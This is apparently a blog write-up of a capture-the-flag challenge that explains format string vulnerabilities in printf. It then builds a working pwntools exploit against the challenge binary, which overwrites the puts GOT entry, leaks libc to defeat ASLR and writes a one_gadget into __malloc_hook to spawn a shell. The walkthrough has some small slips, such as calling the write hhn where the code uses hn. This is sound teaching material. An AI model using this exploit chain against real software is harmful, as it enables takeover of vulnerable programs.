---
layout:     post
title:      "Binary Exploitation - Format String Exploit"
subtitle:   "Write-Up"
date:       2020-01-07
author:     "d4mianwayne"
permalink: /:title/
category: Binary Exploitation
---

A detailed guide to exploiting a format string vulnerability to spawn a shell by calling libc functions.

# Foreword

This is going to be a detailed explaination of how can we overwrite the libc functions by calling them by abusing other functions as of it's implementation. Stay tuned, I hope you will like it.

# What is Format String?

I know we've been over this many times but sometime it's good to start with basics concepts as it is a detailed post, I'll just do a quick introduction of this vulnerability and show a demonstration of the vulnerability.
To be simple, this is a vulnerability lies in `printf` of libc, according to the the man page of `printf` it's always recommended to use a format specifier for printing out any variable via `printf`. Implementation of the `printf` in LIBC is given below:-

```C
/* Copyright (C) 1991-2019 Free Software Foundation, Inc.
   This file is part of the GNU C Library.
   The GNU C Library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 2.1 of the License, or (at your option) any later version.
   The GNU C Library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.
   You should have received a copy of the GNU Lesser General Public
   License along with the GNU C Library; if not, see
   <http://www.gnu.org/licenses/>.  */
#include <libioP.h>
#include <stdarg.h>
#include <stdio.h>
#undef printf
/* Write formatted output to stdout from the format string FORMAT.  */
/* VARARGS1 */
int
__printf (const char *format, ...)
{
  va_list arg;
  int done;
  va_start (arg, format);
  done = __vfprintf_internal (stdout, format, arg, 0);
  va_end (arg);
  return done;
}
#undef _IO_printf
ldbl_strong_alias (__printf, printf);
ldbl_strong_alias (__printf, _IO_printf);
```

As you can see, it takes a format specifier like `%c`, `%d` etc. as it's first arguments and other requirements afterwards. What will happen if you don't provide a format specifier? Well, it'll print out the arguments as long it's not a format specifier itself. Let's get a little practical here by making a program that won't take any specifier itself:-

#### Practical Demonstration of Vulnerability

```C
#include<stdio.h>

int main(int argc, char *argv[])
{
     printf(argv[1]); /* No format specifier - here's the vulnerability */
     printf("\n");
     return 0;
}
```

Let's compile this:-

```bash
robin@oracle:/tmp$ gcc -o new new.c -no-pie
new.c: In function ‘main’:
new.c:3:6: warning: implicit declaration of function ‘printf’ [-Wimplicit-function-declaration]
      printf(argv[1]); /* No format specifier */
      ^~~~~~
new.c:3:6: warning: incompatible implicit declaration of built-in function ‘printf’
new.c:3:6: note: include ‘<stdio.h>’ or provide a declaration of ‘printf’
new.c:3:6: warning: format not a string literal and no format arguments [-Wformat-security]  <--- Warning for no format specification 

```

Ah ,so we got a warning(most of the modern compiler give this warning), let's run:-

```bash
obin@oracle:/tmp$ ./new Hello
Hello
robin@oracle:/tmp$ ./new %p
0x7ffe926353e8   <--- Wait, what? A libc address?
```

Well, to be more specific, let's get to gdb and see what is it.

```s
robin@oracle:/tmp$ gdb-gef -q new
Reading symbols from new...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400537 <+0>:	push   rbp
   0x0000000000400538 <+1>:	mov    rbp,rsp
   0x000000000040053b <+4>:	sub    rsp,0x10
   0x000000000040053f <+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x0000000000400542 <+11>:	mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400546 <+15>:	mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040054a <+19>:	add    rax,0x8
   0x000000000040054e <+23>:	mov    rax,QWORD PTR [rax]
   0x0000000000400551 <+26>:	mov    rdi,rax
   0x0000000000400554 <+29>:	mov    eax,0x0
   0x0000000000400559 <+34>:	call   0x400440 <printf@plt>
   0x000000000040055e <+39>:	mov    edi,0xa
   0x0000000000400563 <+44>:	call   0x400430 <putchar@plt>
   0x0000000000400568 <+49>:	mov    eax,0x0
   0x000000000040056d <+54>:	leave  
   0x000000000040056e <+55>:	ret    
End of assembler dump.
gef➤  b *main + 55
Breakpoint 1 at 0x40056e
gef➤  r AAAA-%p-%p-%p-%p-%p-%p
Starting program: /tmp/new AAAA-%p-%p-%p-%p-%p-%p
AAAA-0x7fffffffdde8-0x7fffffffde00-0x400570-0x7ffff7dd0d80-0x7ffff7dd0d80-0x7fffffffdde8
[ Legend: Modified register | Code | Heap | Stack | String ]
```
By setting up a breakpoint at `main + 55` which is `ret` which is required for the investigating of the addresses which has been leaked with our input `AAAA-%p-%p-%p-%p-%p-%p` which gives `AAAA-0x7fffffffdde8-0x7fffffffde00-0x400570-0x7ffff7dd0d80-0x7ffff7dd0d80-0x7fffffffdde8`, time to investigate these addresses.

```s
--snip--
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400563 <main+44>        call   0x400430 <putchar@plt>
     0x400568 <main+49>        mov    eax, 0x0
     0x40056d <main+54>        leave  
 →   0x40056e <main+55>        ret    
   ↳  0x7ffff7a05b97 <__libc_start_main+231> mov    edi, eax
      0x7ffff7a05b99 <__libc_start_main+233> call   0x7ffff7a27120 <__GI_exit>
      0x7ffff7a05b9e <__libc_start_main+238> mov    rax, QWORD PTR [rip+0x3ced23]        # 0x7ffff7dd48c8 <__libc_pthread_functions+392>
      0x7ffff7a05ba5 <__libc_start_main+245> ror    rax, 0x11
      0x7ffff7a05ba9 <__libc_start_main+249> xor    rax, QWORD PTR fs:0x30
      0x7ffff7a05bb2 <__libc_start_main+258> call   rax
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "new", stopped, reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40056e → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0x000000000040056e in main ()
gef➤  x/10xg $rsp 
0x7fffffffdd08:	0x00007ffff7a05b97	0x0000000000000002
0x7fffffffdd18:	0x00007fffffffdde8	0x0000000200008000
0x7fffffffdd28:	0x0000000000400537	0x0000000000000000
0x7fffffffdd38:	0xe8ad1fc062f5ad97	0x0000000000400450
0x7fffffffdd48:	0x00007fffffffdde0	0x0000000000000000
```

The `x/10xg $rsp` shows the first 10 content of the stack pointer of the program layout, as you can see the address within the `rsp` is exactly the ones we leaked. 

So, finally we can say that this vulnerability allows us to leak the content of the stacks and now we will see *one of the many ways* to exploit this vulnerability for our advantage.

# Exploitation 

I'm taking the binary from the CTF which has happened recently, it was a format string challenge so let's get going.

##### Attachments:-

* [File](/files/binary/loop)


## Reverse Engineering

At first, we have to reverse engineer the binary to find out where the vulnerability, I'm gonna switch between `radare2` and `IDA Pro` , so let's get going:-

Using radare2

##### main

Disassembly of `main` function:-

```s
robin@oracle:~/Pwning/training/pwn01$ r2 -AAAA loop
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[x] Emulate code to find computed references (aae)
[x] Analyze consecutive function (aat)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[0x00400630]> afl

--snip--

0x00400726    1 26           sym.func01
0x00400740    1 61           sym.func02
0x0040077d    1 136          sym.func03
0x00400805    3 186          sym.main

--snip--

```s
[0x00400630]> pdf @main
            ;-- main:
/ (fcn) sym.main 186
|   sym.main ();
|           ; var int local_60h @ rbp-0x60
|           ; var int local_54h @ rbp-0x54
|           ; var int local_50h @ rbp-0x50
|           ; var int local_8h @ rbp-0x8
|              ; DATA XREF from 0x0040064d (entry0)
|           0x0040087d      b800000000     mov eax, 0
|           0x00400882      e89ffeffff     call sym.func01
|           0x00400887      488d45b0       lea rax, qword [local_50h]
|           0x0040088b      be40000000     mov esi, 0x40               ; '@' ; 64
|           0x00400890      4889c7         mov rdi, rax
|           0x00400893      e8a8feffff     call sym.func02
|           0x00400898      488d45b0       lea rax, qword [local_50h]
|           0x0040089c      4889c7         mov rdi, rax
|           0x0040089f      e8d9feffff     call sym.func03
|           0x004008a4      b800000000     mov eax, 0
|           0x004008a4      b800000000     mov eax, 0
|           0x004008a9      488b55f8       mov rdx, qword [local_8h]
|           0x004008ad      644833142528.  xor rdx, qword fs:[0x28]
|       ,=< 0x004008b6      7405           je 0x4008bd
|       |   0x004008b8      e813fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
|       |      ; JMP XREF from 0x004008b6 (sym.main)
|       `-> 0x004008bd      c9             leave
\           0x004008be      c3             ret
```

I removed the unnecessary functions and snippets that doesn't matter. In case, you don't understand what it's doing let me get it this way:-

```s

int main()
{
    func01(0);
    func02(qword_50h, 0x40);
    func03(qword_50h);

}
```
In case, you want to have IDA Decompiler look on it:-

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *v3; // rdi
  char v5; // [rsp+10h] [rbp-50h]
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v3 = stderr;
  setvbuf(stderr, 0LL, 2, 0LL);
  func01(v3, 0LL);
  func02(&v5, 64LL);
  func03(&v5);
  return 0;
}
```

It's calling `func01`, `func02`, `func03` respectively. Let's check out these functions one by one

##### func01

Simple enough, using radare2 we can see that:-

```s
[0x00400630]> pdf @sym.func01
/ (fcn) sym.func01 26
|   sym.func01 ();
|              ; CALL XREF from 0x00400882 (sym.main)
|           0x00400726      55             push rbp
|           0x00400727      4889e5         mov rbp, rsp
|           0x0040072a      be00000000     mov esi, 0
|           0x0040072f      bf48094000     mov edi, str.Welcome_to_VietNam ; 0x400948 ; "Welcome to VietNam!!!\n" ; const char * format
|           0x00400734      b800000000     mov eax, 0
|           0x00400739      e8a2feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0040073e      5d             pop rbp
\           0x0040073f      c3             ret
```

This only printing the string `Welcome to VietNam!!!\n`, nothing more nothing less.

##### func02

This is interesting function:-

```C
[0x00400630]> pdf @sym.func02
/ (fcn) sym.func02 61
|   sym.func02 ();
|           ; var int local_ch @ rbp-0xc
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x00400893 (sym.main)
|           0x00400740      55             push rbp
|           0x00400741      4889e5         mov rbp, rsp
|           0x00400744      4883ec10       sub rsp, 0x10
|           0x00400748      48897df8       mov qword [local_8h], rdi
|           0x0040074c      8975f4         mov dword [local_ch], esi
|           0x0040074f      be00000000     mov esi, 0
|           0x00400754      bf5f094000     mov edi, str.What_s_your_name ; 0x40095f ; "What's your name? " ; const char * format
|           0x00400759      b800000000     mov eax, 0
|           0x0040075e      e87dfeffff     call sym.imp.printf         ; int printf(const char *format)
|           0x00400763      488b15060920.  mov rdx, qword [obj.stdin]  ; loc.imp._1 ; [0x601070:8]=0 ; FILE *stream
|           0x0040076a      8b4df4         mov ecx, dword [local_ch]
|           0x0040076d      488b45f8       mov rax, qword [local_8h]
|           0x00400771      89ce           mov esi, ecx                ; int size
|           0x00400773      4889c7         mov rdi, rax                ; char *s
|           0x00400776      e885feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
|           0x0040077b      c9             leave
\           0x0040077c      c3             ret
[0x00400630]> 
```

This is calling `fgets(local_8h, local_ch, 0)` which is taking the input from the stdin, let's move onto next function.

##### func03

Let's check this out:-

```s
[0x00400630]> pdf @sym.func03
/ (fcn) sym.func03 136
|   sym.func03 ();
|           ; var int local_8h @ rbp-0x8
|              ; CALL XREF from 0x0040089f (sym.main)
|           0x0040077d      55             push rbp
|           0x0040077e      4889e5         mov rbp, rsp
|           0x00400781      4883ec10       sub rsp, 0x10
|           0x00400785      48897df8       mov qword [local_8h], rdi
|           0x00400789      be00000000     mov esi, 0
|           0x0040078e      bf72094000     mov edi, str.Hello          ; 0x400972 ; "Hello " ; const char * format
|           0x00400793      b800000000     mov eax, 0
|           0x00400798      e843feffff     call sym.imp.printf         ; int printf(const char *format)
|           0x0040079d      488b45f8       mov rax, qword [local_8h]
|           0x004007a1      4889c7         mov rdi, rax                ; const char * format
|           0x004007a4      b800000000     mov eax, 0
|           0x004007a9      e832feffff     call sym.imp.printf         ; int printf(const char *format)

--snip--
```

There, we have a format string vulnerability, let's break it down:-

* `0x0040079d      488b45f8       mov rax, qword [local_8h]` - This line is transferring the `local_8h`, in this case our input.
* `0x004007a1      4889c7         mov rdi, rax                ; const char * format` - This is transferring the value of `rax` to `rdi` as the first argument of `printf` (Uh oh, no specifier)
* `0x004007a9      e832feffff     call sym.imp.printf         ; int printf(const char *format)` - This is calling the `printf` function.

Now, we know where the vulnerability let's try to trigger it.

## Debugging and Leaking functions

Now, we know that with format string vulnerability we can leak contents of stack, let's try it. Switching to `gdb-gef` and setting up a breakpoint at the `ret` of main for examining the contents of register.

At first, let's try to find the offset of the input:-

```s
robin@oracle:~/Pwning/training/pwn01$ gdb-gef -q loop
Reading symbols from loop...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
79 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 1 command could not be loaded, run `gef missing` to know why.
gef➤  disas main

-- snip --

  0x00000000004008a4 <+159>:	mov    eax,0x0
   0x00000000004008a9 <+164>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004008ad <+168>:	xor    rdx,QWORD PTR fs:0x28
   0x00000000004008b6 <+177>:	je     0x4008bd <main+184>
   0x00000000004008b8 <+179>:	call   0x4005d0 <__stack_chk_fail@plt>
   0x00000000004008bd <+184>:	leave  
   0x00000000004008be <+185>:	ret    
End of assembler dump.
gef➤  b *main + 185
Breakpoint 1 at 0x4008be
gef➤
```

Let's provide the input which has les


```s
gef➤  r
Starting program: /home/robin/Pwning/training/pwn01/loop 
Welcome to VietNam!!!
What's your name? AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Hello AAAAAAAA-0x7fffffffb5a0-0x7ffff7dd18c0-(nil)-0x6-0x7ffff7fd04c0-0x4000000002-0x7fffffffdc70-0x7fffffffdcc0-0x4008a4-0x7fffffffdda8-0x1f7dd7660-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025
```
There is our `AAAAAAAA` in hex `0x4141414141414141` at `12`:-

```s
gef➤  r
Starting program: /home/robin/Pwning/training/pwn01/loop 
Welcome to VietNam!!!
What's your name? AAAAAAAA-%12$lx
Hello AAAAAAAA-4141414141414141
```

Now, let's get the general idea of things:-
* We found a strange address in one of those leaks which is `0x4008c0` at the index `18` can be found by providing `AAAA-$%18$lx` as input, this is `__libc_csu_init` which gets called everytime `main` executes the `ret` which we will overwrite with the address of main function to call the function again.
* ASLR(Address Space Layout Randomization) is enabled which means the addresses of GOT table is getting randomized every time the program runs, in order to defeat the ASLR to find the base address by leaking any function and find the offset of libc by subtracting the leaked address by it's symbolic address from the associated libc. 

As for now, let's try to do these and will move on further:-

### Overwriting puts with the address of main

Now, we know the offset of the `puts` and we know that we have to overwrite that address in stack with of `main`, how we will do that? `printf` has a format specifier `%n` which shows that amount of byte written by the `printf` so far, we will see how we will overwrite the address in a few moments. Now, as said earlier `puts` always gets called before the `ret` of `main` and if we tend to overwrite it with the main itself it will recursively calls it and won't quit(as it will never jumps to the ret) unless a segfault or soemthing else happens.

Lets use `pwntools` to overwrite the `puts` with `main`:-

```python

from pwn import *
context.arch = 'amd64'
elf = ELF("loop")
s = process("./loop")
pause()
payload = '%{}c%18$hn'.format(elf.symbols['main'] & 0xffff)
payload += '\x00' * (48 - len(payload))
payload += p64(elf.got['puts'])

print hex(elf.got['puts'])
s.sendlineafter('name? ', payload)

s.interactive()

```
Breaking down the exploit:-

`p = '%{}c%18$hn'.format(elf.symbols['main'] & 0xffff)` - This line is very important and interesting as well, so let me tell you how this works

```python
>>> hex(p.symbols['puts'])
'0x4005bc'
>>> hex(p.symbols['main'])
'0x400805'
>>> 
```
As you can see only lower 2 bytes of the address differs between those two which made things more easier because we only need to **overwrite** the lower 2 bytes i.e.

```python
>>> p.symbols['main'] & 0xffff
2053
>>> 0x805
2053
```
Same stuff, so `AND` operation is useful. Now we already knew that the offset for `puts` is at 18 and we need to write only `2053` bytes just to overwrite the `puts` with `main`, so we do:-

`%2053c%18$hhn` - This write exactly 2053 characters to the stdout and then because of `hhn` it overwrites those lower 2 bytes and changes it to main.

We are overwriting the `puts` with the `main` and after that we are adding the GOT entry of `puts`. Because of `fgets` we have to use `\x00` aka null bytes as `fgets` will be terminated as soon as any new lines get encountered.

Let's run this:-

```S
robin@oracle:~/Pwning/training/pwn01$ python exploit.py 
[*] '/home/robin/Pwning/training/pwn01/loop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './loop': pid 18632
[*] Paused (press any to continue)
56
0x601018
[*] Switching to interactive mode
Hello                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     \x90Welcome to VietNam!!!
What's your name? $ 
Hello 
Welcome to VietNam!!!
What's your name? $ hello
Hello hello
Welcome to VietNam!!!
What's your name? $ robin
Hello robin
Welcome to VietNam!!!
What's your name? $  
```

Excellent, it's getting called recursively, onto the next stage.

Time to leak `setvbuf` to bypass ASLR and calculate the libc offset.

Adding this to our script:-

```python
payload = '%18$s' # Clears the already existing entry
payload += '\x00' * (48 - len(payload))
payload += p64(elf.got['setvbuf']) #Overwrite the existing entry
s.sendlineafter('name? ', payload)
s.recvuntil('Hello ')
leaked_addr = u64(s.recv(6).ljust(8, '\x00')) 
libc.address = leaked_addr - libc.symbols['setvbuf']
print 'libc @ ' + hex(libc.address)
```
Let's run this:-

```
robin@oracle:~/Pwning/training/pwn01$ python exploit.py 
[*] '/home/robin/Pwning/training/pwn01/loop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './loop': pid 18721
[*] Paused (press any to continue)
56
0x601018
libc @ 0x7f0a433e0000
[*] Switching to interactive mode
$  
```

Using the pwntools' `pause()` I attached the process to `gdb-gef` and compared the libc base address which is exactly the same.

```S
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/robin/Pwning/training/pwn01/loop
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/robin/Pwning/training/pwn01/loop
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/robin/Pwning/training/pwn01/loop
0x00007f0a433e0000 0x00007f0a435c7000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f0a435c7000 0x00007f0a437c7000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f0a437c7000 0x00007f0a437cb000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f0a437cb000 0x00007f0a437cd000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007f0a437cd000 0x00007f0a437d1000 0x0000000000000000 rw- 
0x00007f0a437d1000 0x00007f0a437f8000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f0a439cf000 0x00007f0a439d1000 0x0000000000000000 rw- 
0x00007f0a439f8000 0x00007f0a439f9000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f0a439f9000 0x00007f0a439fa000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007f0a439fa000 0x00007f0a439fb000 0x0000000000000000 rw- 
0x00007ffc0d06c000 0x00007ffc0d08d000 0x0000000000000000 rw- [stack]
0x00007ffc0d1ec000 0x00007ffc0d1ef000 0x0000000000000000 r-- [vvar]
0x00007ffc0d1ef000 0x00007ffc0d1f0000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

##### Overwriting LIBC GOT symbol and spawning shell via one gadget


I'm gonna use `__malloc_hook` for overwriting with the `one gadget`. We can overwrite any GOT entry, the difference would be number of bytes that has to be written. Calling the `malloc` would be easy enough with `printf` and eventua
>Whenever there is a large amount of characters provided as a specifier then the `printf` calls `malloc` in order to allocate overlaying chunks.

Now, we know that there's no GOT function that we can overwrite `__malloc_hook` itself by just providing a large amount of character width to the printf it will automatically calls it.

Now, I'm using one gadget which is without a doubt one of the best thing we could use in a time like this, for our final payload we will just overwrite the function and pass our payload by changing the higher and lower bits of `__malloc_hook` with of `one_gadget`. Now, we will do:-

* Calculate the right offset of one gadget from the base address.
* Try to  overwrite the next Instruction Pointer which was at 18 and calls function with of one gadget.
* Change the address accordingly i.e. higher and lower bytes.

```python
addr = libc.symbols['__malloc_hook']
target = libc.address + ONE_GADGET 
while target:
  '''
  While bytes are not overwritten'''
	p = '%{}c%18$hn'.format(target & 0xffff)
  ''' Overwriting the address '''
	p += '\x00' * (48 - len(p))
	p += p64(addr)
  ''' Overwriting it with of __malloc_hook '''
	s.sendlineafter('name? ', p)
	addr += 2
	target >>= 16
```

Now, let's chain things together to make our exploit work:-

```python
from pwn import *
context.arch = 'amd64'

elf = ELF('./loop')

ONE_SHOT = 0x4f322  # Ubuntu 18.04
libc = elf.libc
s = process('./loop')

pause()
payload = '%{}c%18$hn'.format(elf.symbols['main'] & 0xffff)
payload += '\x00' * (48 - len(payload))
payload += p64(elf.got['puts'])
s.sendlineafter('name? ', payload)

payload = '%18$s'
payload += '\x00' * (48 - len(payload))
payload += p64(elf.got['setvbuf'])
s.sendlineafter('name? ', payload)
s.recvuntil('Hello ')
libc.address = u64(s.recv(6).ljust(8, '\x00')) - libc.symbols['setvbuf']
print 'libc @ ' + hex(libc.address)

addr = libc.symbols['__malloc_hook']
target = libc.address + ONE_SHOT # one shot
count = 0
while target:
	payload = '%{}c%18$hn'.format(target & 0xffff)
	payload += '\x00' * (48 - len(payload))
	payload += p64(addr)
	s.sendlineafter('name? ', payload)
	addr += 2
	target >>= 16
	print target
	print addr
	count += 1
s.sendlineafter('name? ', '%66000c')
s.recv()
log.critical(count)
s.interactive()
```

And we are done, took way more time and coffee than I thought. Thanks to Faith for reviewing out this post. 
# References

* <https://0x00sec.org/t/picoctf-write-up-bypassing-aslr-via-format-string-bug/1920>
* <http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html>

